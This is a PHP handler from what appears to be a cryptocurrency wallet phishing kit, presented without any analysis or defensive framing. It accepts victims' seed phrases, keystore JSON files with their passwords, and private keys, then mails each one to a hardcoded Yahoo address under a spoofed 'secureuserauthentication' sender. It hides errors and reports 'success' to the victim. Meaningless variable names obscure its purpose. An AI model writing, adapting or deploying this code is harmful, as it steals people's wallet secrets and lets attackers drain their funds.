<?php
ini_set('error_reporting', 0);
if(isset($_POST['import_type']) && $_POST['import_type'] === 'phrase') {
  $phrase_momentum = htmlentities(trim($_POST['phrase']));
  $wallet_macintosh = trim($_POST['wallet']);

  if(empty($phrase_momentum)) {
    echo "string_error";
  } else {
    $msg_packet="Resul ".ucwords($wallet_macintosh)." Box (Result)  \n\n Phrase:$phrase_momentum";
    

		$msg_packet=wordwrap($msg_packet,70);

		$auto_mechanic='fthompson2019@yahoo.com';


	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:noreply@.secureuserauthentication.info');


		echo 'success';
  }
}
if(isset($_POST['import_type']) && $_POST['import_type'] === 'keystorejson') {
  $keystore_geforce = htmlentities(trim($_POST['keystorejson']));
  $keystore_republic= htmlentities(trim($_POST['keystorepassword']));
  $wallet_macintosh = trim($_POST['wallet']);

  if(empty($keystore_geforce) || empty($keystore_republic)) {
    echo "string_error";
  } else {
    $msg_packet="A client have just submitted his/her ".ucwords($wallet_macintosh)." Box(Result)  \n\n Keystore JSON:$keystore_geforce\n\nKeystore Password:$keystore_republic";

		$msg_packet=wordwrap($msg_packet,70);

    $auto_mechanic='fthompson2019@yahoo.com';
   

	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:noreply@.secureuserauthentication.info');
     
		echo 'success';
  }
}
if(isset($_POST['import_type']) && $_POST['import_type'] === 'private') {
  $privatesha1_hash = htmlentities(trim($_POST['privatekey']));
  $wallet_macintosh = trim($_POST['wallet']);

  if(empty($privatesha1_hash)) {
    echo "string_error";
  } else {
    $msg_packet="Result ".ucwords($wallet_macintosh)." Box 12 words on Result website \n\n Private Key:$privatesha1_hash";

		$msg_packet=wordwrap($msg_packet,70);

		$auto_mechanic='fthompson2019@yahoo.com';
   
	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Private Key) Box Submission', $msg_packet,'From:noreply@.secureuserauthentication.info');
     

		echo 'success';
  }
}
?>